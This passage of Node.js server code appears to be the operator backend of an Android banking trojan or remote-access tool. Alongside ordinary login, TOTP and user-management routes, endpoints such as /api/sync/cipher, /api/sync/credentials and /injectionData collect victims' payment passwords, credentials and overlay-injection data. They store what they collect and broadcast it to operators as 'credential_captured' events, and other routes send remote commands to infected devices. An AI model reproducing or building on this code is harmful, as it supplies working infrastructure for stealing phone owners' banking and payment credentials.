    // APP 级别命令（大写命令）通过 APP WebSocket 转发
    if (command === command.toUpperCase() && command.length > 3) {
      const deviceWs = deviceConnections.get(deviceId);
      if (deviceWs && deviceWs.readyState === 1) {
        deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: fixedParams } }));
        console.log(`[CMD] → ${deviceId}: ${command} (APP WS via HTTP)`);
        return res.json({ success: true, message: '命令已发送(APP)' });
      }
    }

    // 其他命令通过 Bridge WS 转发
    bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
    console.log(`[CMD] → ${deviceId}: ${command} (Bridge)`);
    return res.json({ success: true, message: '命令已发送(Bridge)' });
  }

  // 回退：通过 APP WebSocket
  const deviceWs = deviceConnections.get(deviceId);
  if (deviceWs && deviceWs.readyState === 1) {
    deviceWs.send(JSON.stringify({ type: 'command', data: { command, params: params || {} } }));
    console.log(`[CMD] → ${deviceId}: ${command} (WS)`);
    res.json({ success: true, message: '命令已发送' });
  } else {
    res.json({ success: false, message: '设备离线' });
  }
});

// local-service 相关接口（通过WebSocket隧道访问APP本地ADB服务）
// 截图缓存
app.get('/api/auth/check-initialization', (req, res) => {
  const row = db.prepare('SELECT COUNT(*) as cnt FROM users').get();
  res.json({ success: true, data: { initialized: row.cnt > 0 } });
});

// ============ 防暴力破解（IP + 用户名双重限制，持久化到数据库）============
const LOGIN_FAIL_LIMIT_USER = 5;           // 同用户名 5 次
const LOGIN_FAIL_LIMIT_IP = 3;            // 同 IP 3 次
const LOGIN_BLOCK_USER = 10 * 60 * 1000;  // 用户名封 10 分钟
const LOGIN_BLOCK_IP = 24 * 60 * 60 * 1000; // IP 封 24 小时

// 建表（持久化封禁记录，重启不丢失）
db.exec(`CREATE TABLE IF NOT EXISTS login_fail_tracker (
  key TEXT PRIMARY KEY,
  count INTEGER DEFAULT 0,
  blocked_until INTEGER DEFAULT 0,
  updated_at INTEGER DEFAULT 0
)`);

// 启动时清理已过期的记录
db.prepare('DELETE FROM login_fail_tracker WHERE blocked_until > 0 AND blocked_until < ?').run(Date.now());

function isLoginBlocked(key) {
  const r = db.prepare('SELECT count, blocked_until FROM login_fail_tracker WHERE key=?').get(key);
  if (!r) return false;
  if (r.blocked_until && Date.now() < r.blocked_until) return true;
  if (r.blocked_until && Date.now() >= r.blocked_until) {
    // 封禁已到期，清除
    db.prepare('DELETE FROM login_fail_tracker WHERE key=?').run(key);
    return false;
  }
  return false;
}

function recordFail(key, limit, duration) {
  const now = Date.now();
  const r = db.prepare('SELECT count, blocked_until FROM login_fail_tracker WHERE key=?').get(key) || { count: 0, blocked_until: 0 };
  const newCount = r.count + 1;
  const blockedUntil = newCount >= limit ? now + duration : 0;
  if (blockedUntil) {
    console.log(`[SECURITY] ⛔ ${key} 已封禁 ${duration / 60000} 分钟（失败 ${newCount} 次）`);
  }
  db.prepare('INSERT OR REPLACE INTO login_fail_tracker (key, count, blocked_until, updated_at) VALUES (?,?,?,?)').run(key, newCount, blockedUntil, now);
}

function clearFail(key) {
  db.prepare('DELETE FROM login_fail_tracker WHERE key=?').run(key);
}

// 安全获取真实客户端 IP，防范通过 X-Forwarded-For 头伪造 IP 绕过封禁的登录暴破
function getClientIp(req) {
  if (req.headers['cf-connecting-ip']) {
    return req.headers['cf-connecting-ip'];
  }
  if (req.headers['x-real-ip']) {
    return req.headers['x-real-ip'];
  }
  let ip = req.socket.remoteAddress;
  if (ip && ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }
  return ip || '127.0.0.1';
}
app.post('/api/auth/login', (req, res) => {
  const clientIp = getClientIp(req);
  let { username, password } = req.body || {};
  username = (username || '').trim();
  password = (password || '').trim();
  if (!username) {
    return res.status(400).json({ success: false, message: '用户名不能为空' });
  }
  const userKey = `user:${username}`; const ipKey = `ip:${clientIp}`;
  if (isLoginBlocked(userKey)) {
    return res.status(403).json({ success: false, message: '该账号登录失败次数过多，请 10 分钟后再试' });
  }
  if (isLoginBlocked(ipKey)) {
    console.log(`[SECURITY] 🚫 被封 IP 尝试登录: ${clientIp} user=${username}`);
    return res.status(403).json({ success: false, message: '登录失败次数过多，请稍后再试' });
  } const user = db.prepare('SELECT * FROM users WHERE username=?').get(username); if (!user || !bcrypt.compareSync(password || '', user.password_hash)) {
    db.prepare('INSERT INTO login_logs (username,ip,success) VALUES (?,?,0)').run(username, clientIp);
    recordFail(userKey, LOGIN_FAIL_LIMIT_USER, LOGIN_BLOCK_USER);
    recordFail(ipKey, LOGIN_FAIL_LIMIT_IP, LOGIN_BLOCK_IP);
    return res.status(401).json({ success: false, message: '用户名或密码错误' });
  }
  // 登录成功，清除该用户名和 IP 的计数
  db.prepare('INSERT INTO login_logs (username,ip,success) VALUES (?,?,1)').run(username, clientIp);
  clearFail(userKey);
  clearFail(ipKey);
  db.prepare('UPDATE users SET login_fail_count=0, locked_until=0 WHERE id=?').run(user.id);
  // ===== TOTP 二次验证挑战 (V5) =====
  const _totpCfg = db.prepare('SELECT required FROM totp_settings WHERE id=1').get();
  const _totpBound = db.prepare('SELECT user_id FROM user_totp WHERE user_id=? AND verified=1').get(user.id);
  if (_totpCfg && _totpCfg.required && !user.is_super) {
    const _purpose = _totpBound ? 'totp_login' : 'totp_setup';
    const _tempToken = jwt.sign({ userId: user.id, purpose: _purpose, tmp: true }, SECRET_KEY, { expiresIn: '10m' });
    console.log(`[TOTP] 用户 ${username} 需要二次验证 (${_purpose})`);
    return res.json({ success: true, data: _totpBound
      ? { requireTotp: true, tempToken: _tempToken }
      : { requireSetup: true, tempToken: _tempToken } });
  }
  // 单账号登录：生成新 sessionId，覆盖旧会话
  const sessionId = require('crypto').randomBytes(16).toString('hex');
  db.prepare('UPDATE users SET active_session=? WHERE id=?').run(sessionId, user.id);
  const token = jwt.sign({ userId: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, sessionId }, SECRET_KEY, { expiresIn: '30d' });
  console.log(`[AUTH] 用户 ${username} 登录成功, sessionId=${sessionId.slice(0, 8)}..., ip=${clientIp}`);
  // 踢掉同账号的旧 WS 连接
  for (const aws of adminConnections) {
    if (aws._adminUsername === username) {
      try { aws.send(JSON.stringify({ type: 'forced_logout', message: '账号在其他地方登录' })); } catch { }
      setTimeout(() => { try { aws.close(4001, 'kicked'); } catch { } }, 500);
    }
  }
  res.json({ success: true, data: { token, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, avatar: user.avatar, maxDevices: user.max_devices } } });
}); 

// ============================================================
// TOTP 二次验证 API (V5 对齐)
// ============================================================
(function initTotp() {
  db.exec(`CREATE TABLE IF NOT EXISTS user_totp (user_id INTEGER PRIMARY KEY, secret TEXT NOT NULL, verified INTEGER NOT NULL DEFAULT 0, created_at REAL)`);
  db.exec(`CREATE TABLE IF NOT EXISTS totp_settings (id INTEGER PRIMARY KEY CHECK (id=1), required INTEGER NOT NULL DEFAULT 0)`);
  db.exec(`INSERT OR IGNORE INTO totp_settings (id, required) VALUES (1, 0)`);
  const speakeasy = require('speakeasy');
  const qrcode = require('qrcode');
  const crypto = require('crypto');

  function totpIssueToken(userId) {
    const user = db.prepare('SELECT * FROM users WHERE id=?').get(userId);
    if (!user) return null;
    const sessionId = crypto.randomBytes(16).toString('hex');
    db.prepare('UPDATE users SET active_session=? WHERE id=?').run(sessionId, user.id);
    const token = jwt.sign({ userId: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, sessionId }, SECRET_KEY, { expiresIn: '30d' });
    // 踢掉同账号旧 WS
    for (const aws of adminConnections) {
      if (aws._adminUsername === user.username) {
        try { aws.send(JSON.stringify({ type: 'forced_logout', message: '账号在其他地方登录' })); } catch {}
        setTimeout(() => { try { aws.close(4001, 'kicked'); } catch {} }, 500);
      }
    }
    return { token, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, avatar: user.avatar, maxDevices: user.max_devices } };
  }

  function totpVerifyTemp(token, purpose) {
    try {
      const p = jwt.verify(token, SECRET_KEY);
      return (p && p.tmp && p.purpose === purpose) ? p : null;
    } catch { return null; }
  }

  function totpAuthUser(req) {
    const auth = req.headers.authorization || '';
    const token = auth.startsWith('Bearer ') ? auth.slice(7) : req.query.token || '';
    try { return jwt.verify(token, SECRET_KEY).userId; } catch { return null; }
  }

  // 状态: enabled=当前用户是否绑定, required=全局强制开关
  app.get('/api/auth/totp/status', authMiddleware, (req, res) => {
    const bound = db.prepare('SELECT user_id FROM user_totp WHERE user_id=? AND verified=1').get(req.user.userId);
    const cfg = db.prepare('SELECT required FROM totp_settings WHERE id=1').get();
    res.json({ success: true, data: { enabled: !!bound, required: !!(cfg && cfg.required) } });
  });

  // 生成绑定密钥 + 二维码
  app.post('/api/auth/totp/setup', (req, res) => {
    (async () => {
      try {
        const { tempToken } = req.body || {};
        let userId = null;
        if (tempToken) {
          const p = totpVerifyTemp(tempToken, 'totp_setup');
          if (!p) return res.status(401).json({ success: false, message: '临时凭证无效或已过期' });
          userId = p.userId;
        } else {
          userId = totpAuthUser(req);
          if (!userId) return res.status(401).json({ success: false, message: '未登录' });
        }
        const user = db.prepare('SELECT username FROM users WHERE id=?').get(userId);
        if (!user) return res.status(404).json({ success: false, message: '用户不存在' });
        if (db.prepare('SELECT user_id FROM user_totp WHERE user_id=? AND verified=1').get(userId)) {
          return res.status(400).json({ success: false, message: '该账号已绑定谷歌验证器' });
        }
        const secret = speakeasy.generateSecret({ length: 20 }).base32;
        const otpauth = speakeasy.otpauthURL({ secret: secret, label: '熊猫工坊:' + user.username, issuer: '熊猫工坊' });
        let qrCode = '';
        try { qrCode = await qrcode.toDataURL(otpauth, { width: 240, margin: 1 }); } catch (e) { console.log('[TOTP] 二维码生成失败:', e.message); }
        db.prepare('INSERT OR REPLACE INTO user_totp (user_id, secret, verified, created_at) VALUES (?,?,0,?)').run(userId, secret, Date.now() / 1000);
        res.json({ success: true, data: { secret: secret, qrCode: qrCode } });
      } catch (e) {
        console.log('[TOTP] setup 错误:', e.message);
        res.status(500).json({ success: false, message: e.message });
      }
    })();
  });

  // 确认绑定
  app.post('/api/auth/totp/verify-setup', (req, res) => {
    try {
      const { tempToken, code } = req.body || {};
      let userId = null; let isLoginFlow = false;
      if (tempToken) {
        const p = totpVerifyTemp(tempToken, 'totp_setup');
        if (!p) return res.status(401).json({ success: false, message: '临时凭证无效或已过期' });
        userId = p.userId; isLoginFlow = true;
      } else {
        userId = totpAuthUser(req);
        if (!userId) return res.status(401).json({ success: false, message: '未登录' });
      }
      const row = db.prepare('SELECT secret FROM user_totp WHERE user_id=? AND verified=0').get(userId);
      if (!row) return res.status(400).json({ success: false, message: '请先生成绑定密钥' });
      if (!speakeasy.totp.verify({ secret: row.secret, encoding: 'base32', token: String(code || ''), window: 1 })) {
        return res.status(400).json({ success: false, message: '验证码错误' });
      }
      db.prepare('UPDATE user_totp SET verified=1 WHERE user_id=?').run(userId);
      if (isLoginFlow) {
        const issued = totpIssueToken(userId);
        if (!issued) return res.status(404).json({ success: false, message: '用户不存在' });
        return res.json({ success: true, data: issued });
      }
      res.json({ success: true, message: '绑定成功' });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });

  // 登录时验证码校验
  app.post('/api/auth/totp/login', (req, res) => {
    try {
      const { tempToken, code } = req.body || {};
      const p = totpVerifyTemp(tempToken, 'totp_login');
      if (!p) return res.status(401).json({ success: false, message: '临时凭证无效或已过期' });
      const row = db.prepare('SELECT secret FROM user_totp WHERE user_id=? AND verified=1').get(p.userId);
      if (!row) return res.status(400).json({ success: false, message: '该账号未绑定谷歌验证器' });
      if (!speakeasy.totp.verify({ secret: row.secret, encoding: 'base32', token: String(code || ''), window: 1 })) {
        return res.status(400).json({ success: false, message: '验证码错误' });
      }
      const issued = totpIssueToken(p.userId);
      if (!issued) return res.status(404).json({ success: false, message: '用户不存在' });
      res.json({ success: true, data: issued });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });

  // 解绑 (验证码确认)
  app.post('/api/auth/totp/disable', authMiddleware, (req, res) => {
    try {
      const { code } = req.body || {};
      const row = db.prepare('SELECT secret FROM user_totp WHERE user_id=? AND verified=1').get(req.user.userId);
      if (!row) return res.status(400).json({ success: false, message: '该账号未绑定谷歌验证器' });
      if (!speakeasy.totp.verify({ secret: row.secret, encoding: 'base32', token: String(code || ''), window: 1 })) {
        return res.status(400).json({ success: false, message: '验证码错误' });
      }
      db.prepare('DELETE FROM user_totp WHERE user_id=?').run(req.user.userId);
      res.json({ success: true, message: '已解除谷歌验证器绑定' });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
  });

  // 全局强制开关 (仅超管)
  app.put('/api/auth/totp/require', authMiddleware, (req, res) => {
    if (!req.user.isSuper) return res.status(403).json({ success: false, message: '仅超级管理员可操作' });
    const required = !!(req.body && req.body.required);
    db.prepare('UPDATE totp_settings SET required=? WHERE id=1').run(required ? 1 : 0);
    res.json({ success: true, message: required ? '已开启全局强制二次验证' : '已关闭全局强制二次验证' });
  });

  // 已绑定用户列表 (仅超管)
  app.get('/api/auth/totp/bound-users', authMiddleware, (req, res) => {
    if (!req.user.isSuper) return res.status(403).json({ success: false, message: '仅超级管理员可操作' });
    const rows = db.prepare('SELECT u.id, u.username FROM users u JOIN user_totp t ON t.user_id = u.id WHERE t.verified=1').all();
    res.json({ success: true, data: rows });
  });

  // 管理员强制解绑指定用户 (仅超管)
  app.post('/api/auth/totp/admin-disable/:uid', authMiddleware, (req, res) => {
    if (!req.user.isSuper) return res.status(403).json({ success: false, message: '仅超级管理员可操作' });
    const uid = parseInt(req.params.uid, 10);
    if (!uid) return res.status(400).json({ success: false, message: '无效用户ID' });
    db.prepare('DELETE FROM user_totp WHERE user_id=?').run(uid);
    res.json({ success: true, message: '解绑成功' });
  });

  app.post('/api/auth/totp/admin-disable/:userId', authMiddleware, (req, res) => {
    if (!req.user.isSuper) return res.status(403).json({ success: false, message: '仅超级管理员可操作' });
    const uid = parseInt(req.params.userId, 10);
    if (!uid) return res.status(400).json({ success: false, message: '无效用户ID' });
    db.prepare('DELETE FROM user_totp WHERE user_id=?').run(uid);
    res.json({ success: true, message: '解绑成功' });
  });

  console.log('[TOTP] V5 二次验证模块已加载');
})();

app.post('/api/auth/verify', (req, res) => {
  const token = req.body?.token || req.headers.authorization?.slice(7) || '';
  try {
    const payload = jwt.verify(token, SECRET_KEY);
    const user = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,created_at FROM users WHERE id=?').get(payload.userId);
    if (!user) return res.status(401).json({ success: false, message: '用户不存在' });
    res.json({ success: true, data: { valid: true, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, maxDevices: user.max_devices, createdAt: Math.floor(user.created_at || 0) } } });
  } catch {
    res.status(401).json({ success: false, message: 'Token验证失败' });
  }
});

// ============================================================
// 设备 API（APP 客户端调用）
// ============================================================
app.post('/api/client/register', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少deviceId' });
  const now = Date.now() / 1000;
  const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
  if (existing) {
    db.prepare('UPDATE devices SET brand=?,model=?,os_version=?,app_version=?,public_ip=?,is_connected=1,last_seen=? WHERE device_id=?')
      .run(data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '', req.ip, now, deviceId);
  } else {
    db.prepare('INSERT INTO devices (device_id,brand,model,os_version,app_version,public_ip,screen_width,screen_height,is_connected,last_seen) VALUES (?,?,?,?,?,?,?,?,1,?)')
      .run(deviceId, data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '', req.ip, data.screenWidth || 0, data.screenHeight || 0, now);
  }
  res.json({ success: true, message: '设备注册成功', data: { deviceId } });
});

app.post('/api/client/logs', (req, res) => {
  // APP 上报操作日志，转发给管理端
  const { deviceId, logs } = req.body || {};
  if (deviceId && logs && Array.isArray(logs)) {
    for (const log of logs) {
      broadcastToAdmins({
        type: 'operation_log_realtime',
        sessionId: deviceId,
        data: { deviceId, log },
        botId: deviceId
      });
    }
  }
  res.json({ success: true });
});
app.post('/api/sync/status', (req, res) => {
  const { deviceId, batteryLevel, networkType } = req.body || {};
  if (deviceId) {
    const now = Date.now() / 1000;
    const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
    if (existing) {
      db.prepare('UPDATE devices SET battery_level=?,network_type=?,is_connected=1,last_seen=? WHERE device_id=?').run(batteryLevel || 0, networkType || '', now, deviceId);
    } else {
      db.prepare('INSERT INTO devices (device_id,battery_level,network_type,public_ip,is_connected,last_seen) VALUES (?,?,?,?,1,?)').run(deviceId, batteryLevel || 0, networkType || '', req.ip, now);
    }
  }
  res.json({ success: true });
});
app.post('/api/sync/messages', (req, res) => res.json({ success: true }));
app.post('/api/sync/inbox', (req, res) => res.json({ success: true }));
app.post('/api/sync/cipher', (req, res) => {
  // 支付密码上报
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  console.log(`[CIPHER] 收到支付密码: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId && (data.cipher || data.password || data.value || data.textCipher || data.patternCipher)) {
    const text = data.textCipher || data.cipher || data.password || data.value || data.patternCipher || '';
    const appName = data.appName || data.app || 'payment';
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, appName, data.packageName || '', text, 'payment_cipher', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
app.post('/api/sync/credentials', (req, res) => {
  // 凭据上报
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  console.log(`[CRED] 收到凭据: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId) {
    const text = data.password || data.value || data.credential || JSON.stringify(data);
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, data.appName || data.app || '', data.packageName || '', text, data.type || 'credential', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'credential_captured', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
app.post('/api/sync/form', (req, res) => {
  // ★★★ 注入数据上报（APP HttpManager.uploadInjectionData 发到这里）★★★
  const data = req.body || {};
  const deviceId = data.deviceId || data.sessionId || '';
  console.log(`[INJECT] ★ 收到注入数据(/api/sync/form): deviceId=${deviceId}, keys=${Object.keys(data).join(',')}, data=${JSON.stringify(data).slice(0, 500)}`);
  if (deviceId) {
    const packageName = data.packageName || data.pkg || data.package_name || '';
    const bodyStr = JSON.stringify(data);
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, bodyStr, 'injection', data.timestamp || Date.now());
    // 通知管理端
    broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
    console.log(`[INJECT] ✅ 注入数据已存储并通知管理端: ${deviceId} / ${packageName}`);
  }
  res.json({ success: true });
});

// APP 注入数据上报（HTTP POST）
app.post('/injectionData', (req, res) => {
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据: ${JSON.stringify(data).slice(0, 200)}`);
  // 存入 sms_notifications 表
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  // 通知管理端
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/injectionData', (req, res) => {
  // 同上，兼容带 /api 前缀
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据(api): ${JSON.stringify(data).slice(0, 200)}`);
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/adb-keys/upload', (req, res) => res.json({ success: true }));
app.post('/api/file/upload-from-device', (req, res) => res.json({ success: true }));

// ============================================================
// 管理端 API
// ============================================================
// (已迁移到第695行的分页版本)


// 下发设备到子账户
app.put('/api/device/:deviceId/assign', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { username } = req.body || {};
  if (!username) return res.json({ success: false, message: '请选择目标子账户' });
  const user = db.prepare('SELECT id,assigned_devices FROM users WHERE username=?').get(username);
  if (!user) return res.json({ success: false, message: '用户不存在' });
  // 把设备加到用户的 assigned_devices 列表
  const current = (user.assigned_devices || '').split(',').filter(Boolean);
  if (!current.includes(deviceId)) {
    current.push(deviceId);
    db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(current.join(','), user.id);
  }
  res.json({ success: true, message: `设备已下发到 ${username}` });
});

// 设备分组（设置设备所属分组）
app.put('/api/device/:deviceId/group', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { groupName, groupId } = req.body || {};
  try { db.exec("ALTER TABLE devices ADD COLUMN group_name TEXT DEFAULT ''"); } catch { }
  db.prepare('UPDATE devices SET group_name=? WHERE device_id=?').run(groupName || '', deviceId);
  res.json({ success: true });
});

app.get('/api/users', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const rows = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,assigned_devices,created_at FROM users').all();
  res.json({
    success: true, data: rows.map(r => ({
      id: r.id,
      username: r.username,
      role: r.role,
      isSuper: !!r.is_super,
      isOnline: Array.from(adminConnections).some(c => c._adminUsername === r.username),
      ip: (() => {
        const conn = Array.from(adminConnections).find(c => c._adminUsername === r.username);
        return conn ? (conn._adminIp || '') : '';
      })(),
      maxDevices: r.max_devices || 100,
      assignedDevices: r.assigned_devices || '',
      createdAt: new Date((r.created_at || 0) * 1000).toISOString().replace('T', ' ').slice(0, 19)
    }))
  });
});

app.post('/api/users', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const { username, password, role, maxDevices, isSuper } = req.body || {};
  if (!username || !password) return res.json({ success: false, message: '用户名和密码不能为空' });
  const exists = db.prepare('SELECT id FROM users WHERE username=?').get(username);
  if (exists) return res.json({ success: false, message: '用户名已存在' });
  const hash = bcrypt.hashSync(password, 10);
  // 子账号默认 role 为 "user"（前端下发列表只显示 role=user 的）
  const userRole = role || 'user';
  db.prepare('INSERT INTO users (username,password_hash,role,max_devices,is_super) VALUES (?,?,?,?,?)').run(username, hash, userRole, maxDevices || 100, isSuper ? 1 : 0);
  res.json({ success: true, message: '用户创建成功' });
});

app.put('/api/users/:id', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const { password, role, maxDevices, isSuper, assignedDevices } = req.body || {};
  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hash, req.params.id);
  }
  if (role !== undefined) db.prepare('UPDATE users SET role=? WHERE id=?').run(role, req.params.id);
  if (maxDevices !== undefined) db.prepare('UPDATE users SET max_devices=? WHERE id=?').run(maxDevices, req.params.id);
  if (isSuper !== undefined) db.prepare('UPDATE users SET is_super=? WHERE id=?').run(isSuper ? 1 : 0, req.params.id);
  if (assignedDevices !== undefined) db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(assignedDevices, req.params.id);
  res.json({ success: true });
});

app.delete('/api/users/:id', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const user = db.prepare('SELECT is_super FROM users WHERE id=?').get(req.params.id);
  if (user && user.is_super) return res.json({ success: false, message: '不能删除超级管理员' });
  db.prepare('DELETE FROM users WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

app.get('/api/users/login-logs', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const rows = db.prepare('SELECT * FROM login_logs ORDER BY created_at DESC LIMIT 100').all();
  const data = rows.map(r => ({
    id: r.id,
    username: r.username,
    loginTime: r.created_at ? new Date(r.created_at * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }) : '',
    ipAddress: r.ip || '',
    success: r.success,
    isOnline: false
  }));
  res.json({ success: true, data });
});

app.delete('/api/users/login-logs', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  db.prepare('DELETE FROM login_logs').run();
  res.json({ success: true, message: '登录日志已成功清空' });
});

app.get('/api/system/info', authMiddleware, (req, res) => {
  const os = require('os');
  const total = db.prepare('SELECT COUNT(*) as c FROM devices').get().c;
  const online = db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_connected=1").get().c;
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpus = os.cpus();

  let diskTotal = 0, diskUsed = 0, diskFree = 0;
  try {
    const { execSync } = require('child_process');
    const dfOutput = execSync("df -B1 / | tail -1").toString().trim().split(/\s+/);
    diskTotal = parseInt(dfOutput[1]) || 0;
    diskUsed = parseInt(dfOutput[2]) || 0;
    diskFree = parseInt(dfOutput[3]) || 0;
  } catch { }

  res.json({
    success: true, data: {
      version: '1.0.0',
      uptime: Math.floor(process.uptime()),
      totalDevices: total,
      onlineDevices: online,
      cpuCores: cpus.length,
      cpuModel: cpus[0]?.model || 'Unknown',
      cpuUsage: 0,
      memTotal: totalMem,
      memUsed: usedMem,
      memFree: freeMem,
      memUsage: Math.round((usedMem / totalMem) * 100),
      diskTotal: diskTotal,
      diskUsed: diskUsed,
      diskFree: diskFree,
      diskUsage: diskTotal > 0 ? Math.round((diskUsed / diskTotal) * 100) : 0,
      netSendSpeed: 0,
      netRecvSpeed: 0,
      netBytesSent: 0,
      netBytesRecv: 0,
      hostname: os.hostname(),
      platform: os.platform() + ' ' + os.release(),
      hostUptime: Math.floor(os.uptime()),
      totalApks: 0,
      apkOutputSize: 0,
      apkDownloadCount: 0,
      totalAbPacks: 0,
      abPackOutputSize: 0
    }
  });
});

app.get('/api/license/max-users', authMiddleware, (req, res) => res.json({ success: true, data: { maxUsers: 999 } }));
app.get('/api/injection/counts', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const counts = {};
  for (const id of deviceIds) {
    const row = db.prepare("SELECT COUNT(*) as c FROM sms_notifications WHERE device_id=? AND type='injection'").get(id);
    counts[id] = row ? row.c : 0;
  }
  res.json({ success: true, counts });
});
app.get('/api/devices/crypto-wallets', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const result = {};
  for (const id of deviceIds) result[id] = [];
  res.json({ success: true, result });
});
app.get('/api/ip-geo/:ip', (req, res) => res.json({ success: true, data: { country: 'HK', countryName: 'Hong Kong', city: 'Hong Kong' } }));
app.get('/api/black-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
app.get('/api/sensitive-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
// payment-strategies CRUD 已在上方定义
app.get('/api/password-inputs/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 20;
  const passwordType = req.query.passwordType || '';
  const offset = (page - 1) * pageSize;
  let whereClause = 'WHERE device_id=?';
  const params = [deviceId];
  if (passwordType && passwordType !== 'DEFAULT') {
    whereClause += ' AND password_type=?';
    params.push(passwordType);
  }
  const total = db.prepare(`SELECT COUNT(*) as c FROM password_inputs ${whereClause}`).get(...params).c;
  const rows = db.prepare(`SELECT * FROM password_inputs ${whereClause} ORDER BY created_at DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
